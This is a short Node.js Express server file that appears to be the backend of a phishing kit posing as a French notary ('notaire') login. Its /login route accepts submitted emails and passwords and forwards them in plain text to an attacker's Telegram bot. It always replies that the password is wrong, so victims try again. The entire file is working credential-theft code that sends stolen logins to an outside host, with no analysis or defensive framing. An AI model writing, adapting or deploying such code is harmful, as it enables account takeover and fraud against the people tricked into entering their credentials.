require("dotenv").config();

const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();

app.use(cors());
app.use(express.json());

app.post("/login", async (req, res) => {
    try {
        const { email, password, rememberMe } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: "Champs manquants"
            });
        }

        const message =
`🔐 Nouveau login notaire

📧 Email: ${email}
🔑 Password: ${password}
⭐ Remember: ${rememberMe ? "Oui" : "Non"}`;

        await axios.post(
            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.CHAT_ID,
                text: message
            }
        );

        return res.json({
            success: false,
            message: "Veuillez vérifier que le mot de passe saisi est correct..."
        });

    } catch (err) {
        console.error(err);

        res.status(500).json({
            success: false,
            message: "Erreur serveur"
        });
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running on port " + PORT);
});
